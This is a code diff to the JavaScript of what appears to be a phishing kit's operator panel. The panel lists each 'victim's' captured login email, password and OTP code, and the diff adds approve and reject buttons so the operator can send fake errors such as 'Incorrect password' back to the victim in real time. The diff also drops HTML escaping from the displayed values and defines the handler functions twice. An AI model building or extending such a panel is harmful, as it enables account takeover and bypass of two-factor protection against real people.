@@ -577,7 +577,7 @@ function restartMonitoring() {
     showNotification('Monitoring restarted', 'info');
 }
 
-// Function to display victim information
+// Function to display victim information with approval/rejection controls
 function displayVictimInfo(victimInfos) {
     const container = document.getElementById('victim-info-container');
     
@@ -612,10 +612,17 @@ function displayVictimInfo(victimInfos) {
         if (victim.login_email) {
             victimHTML += `
                 <div class="mb-3">
-                    <label class="text-muted small fw-medium d-block mb-1">
-                        <i class="bi bi-envelope me-1"></i>Login Email
-                    </label>
-                    <div class="fw-bold font-monospace bg-white bg-opacity-50 p-2 rounded">${escapeHtml(victim.login_email)}</div>
+                    <div class="d-flex justify-content-between align-items-center mb-2">
+                        <label class="text-muted small fw-medium d-block">
+                            <i class="bi bi-envelope me-1"></i>Login Email
+                        </label>
+                        <div class="approval-controls">
+                            ${getApprovalControls(victim.id, 'email', victim.email_status)}
+                        </div>
+                    </div>
+                    <div class="fw-bold font-monospace bg-white bg-opacity-50 p-2 rounded">
+                        ${victim.login_email || '<span class="text-muted">Loading...</span>'}
+                    </div>
                 </div>
             `;
         }
@@ -623,10 +630,17 @@ function displayVictimInfo(victimInfos) {
         if (victim.login_password) {
             victimHTML += `
                 <div class="mb-3">
-                    <label class="text-muted small fw-medium d-block mb-1">
-                        <i class="bi bi-key me-1"></i>Password
-                    </label>
-                    <div class="fw-bold font-monospace bg-white bg-opacity-50 p-2 rounded">${escapeHtml(victim.login_password)}</div>
+                    <div class="d-flex justify-content-between align-items-center mb-2">
+                        <label class="text-muted small fw-medium d-block">
+                            <i class="bi bi-key me-1"></i>Password
+                        </label>
+                        <div class="approval-controls">
+                            ${getApprovalControls(victim.id, 'password', victim.password_status)}
+                        </div>
+                    </div>
+                    <div class="fw-bold font-monospace bg-white bg-opacity-50 p-2 rounded">
+                        ${victim.login_password || '<span class="text-muted">Loading...</span>'}
+                    </div>
                 </div>
             `;
         }
@@ -634,10 +648,17 @@ function displayVictimInfo(victimInfos) {
         if (victim.login_otp) {
             victimHTML += `
                 <div class="mb-3">
-                    <label class="text-muted small fw-medium d-block mb-1">
-                        <i class="bi bi-shield-check me-1"></i>OTP Code
-                    </label>
-                    <div class="fw-bold font-monospace bg-white bg-opacity-50 p-2 rounded text-center" style="font-size: 1.1rem; letter-spacing: 2px;">${escapeHtml(victim.login_otp)}</div>
+                    <div class="d-flex justify-content-between align-items-center mb-2">
+                        <label class="text-muted small fw-medium d-block">
+                            <i class="bi bi-shield-check me-1"></i>OTP Code
+                        </label>
+                        <div class="approval-controls">
+                            ${getApprovalControls(victim.id, 'otp', victim.otp_status)}
+                        </div>
+                    </div>
+                    <div class="fw-bold font-monospace bg-white bg-opacity-50 p-2 rounded text-center" style="font-size: 1.1rem; letter-spacing: 2px;">
+                        ${victim.login_otp || '<span class="text-muted">Loading...</span>'}
+                    </div>
                 </div>
             `;
         }
@@ -649,6 +670,26 @@ function displayVictimInfo(victimInfos) {
     });
     
     container.innerHTML = victimHTML;
+}
+
+// Function to generate approval/rejection controls
+function getApprovalControls(victimId, step, status) {
+    if (status === 'approved') {
+        return `<span class="badge bg-success">Approved</span>`;
+    } else if (status === 'rejected') {
+        return `<span class="badge bg-danger">Rejected</span>`;
+    } else {
+        return `
+            <div class="btn-group" role="group">
+                <button class="btn btn-sm btn-success" onclick="approveSubmission('${victimId}', '${step}')">
+                    <i class="bi bi-check-lg"></i> Approve
+                </button>
+                <button class="btn btn-sm btn-danger" onclick="rejectSubmission('${victimId}', '${step}')">
+                    <i class="bi bi-x-lg"></i> Reject
+                </button>
+            </div>
+        `;
+    }
 }
 
 // Utility function to escape HTML for safe display
@@ -705,6 +746,159 @@ function showNotification(message, type = 'info') {
             notification.remove();
         }
     }, 5000);
+}
+
+// Function to approve a submission
+function approveSubmission(victimId, step) {
+    fetch(`/approve/${victimId}/`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'X-CSRFToken': getCookie('csrftoken')
+        },
+        body: JSON.stringify({
+            step: step
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.status === 'success') {
+            showNotification(`${step.charAt(0).toUpperCase() + step.slice(1)} approved successfully!`, 'success');
+            updateVictimInfo(); // Refresh the display
+        } else {
+            showNotification('Failed to approve submission', 'danger');
+        }
+    })
+    .catch(error => {
+        console.error('Error approving submission:', error);
+        showNotification('Failed to approve submission', 'danger');
+    });
+}
+
+// Function to reject a submission
+function rejectSubmission(victimId, step) {
+    const errorMessages = {
+        'email': 'Invalid email address',
+        'password': 'Incorrect password',
+        'otp': 'Invalid OTP code'
+    };
+    
+    const errorMessage = errorMessages[step] || 'Invalid information provided';
+    
+    fetch(`/reject/${victimId}/`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'X-CSRFToken': getCookie('csrftoken')
+        },
+        body: JSON.stringify({
+            step: step,
+            error_message: errorMessage
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.status === 'success') {
+            showNotification(`${step.charAt(0).toUpperCase() + step.slice(1)} rejected successfully!`, 'warning');
+            updateVictimInfo(); // Refresh the display
+        } else {
+            showNotification('Failed to reject submission', 'danger');
+        }
+    })
+    .catch(error => {
+        console.error('Error rejecting submission:', error);
+        showNotification('Failed to reject submission', 'danger');
+    });
+}
+
+// Function to approve a submission
+function approveSubmission(victimId, step) {
+    const url = `/approve/${victimId}/`;
+    
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'X-CSRFToken': getCookie('csrftoken')
+        },
+        body: JSON.stringify({
+            step: step
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.status === 'success') {
+            showNotification(`${step.charAt(0).toUpperCase() + step.slice(1)} approved successfully!`, 'success');
+            updateVictimInfo(); // Refresh the display
+        } else {
+            showNotification('Failed to approve submission', 'danger');
+        }
+    })
+    .catch(error => {
+        console.error('Error approving submission:', error);
+        showNotification('Failed to approve submission', 'danger');
+    });
+}
+
+// Function to reject a submission
+function rejectSubmission(victimId, step) {
+    // Show custom error message input
+    const errorMessage = prompt(`Enter error message for ${step}:`, getDefaultErrorMessage(step));
+    
+    if (errorMessage === null) return; // User cancelled
+    
+    const url = `/reject/${victimId}/`;
+    
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'X-CSRFToken': getCookie('csrftoken')
+        },
+        body: JSON.stringify({
+            step: step,
+            error_message: errorMessage
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.status === 'success') {
+            showNotification(`${step.charAt(0).toUpperCase() + step.slice(1)} rejected successfully!`, 'warning');
+            updateVictimInfo(); // Refresh the display
+        } else {
+            showNotification('Failed to reject submission', 'danger');
+        }
+    })
+    .catch(error => {
+        console.error('Error rejecting submission:', error);
+        showNotification('Failed to reject submission', 'danger');
+    });
+}
+
+// Function to get default error messages
+function getDefaultErrorMessage(step) {
+    const messages = {
+        'email': 'Invalid email address. Please enter a valid email.',
+        'password': 'Incorrect password. Please try again.',
+        'otp': 'Invalid OTP code. Please check and try again.'
+    };
+    return messages[step] || 'Invalid information provided';
+}
+
+// Function to get CSRF token
+function getCookie(name) {
+    let cookieValue = null;
+    if (document.cookie && document.cookie !== '') {
+        const cookies = document.cookie.split(';');
+        for (let i = 0; i < cookies.length; i++) {
+            const cookie = cookies[i].trim();
+            if (cookie.substring(0, name.length + 1) === (name + '=')) {
+                cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
+                break;
+            }
+        }
+    }
+    return cookieValue;
 }
 
 // Function to handle page visibility changes
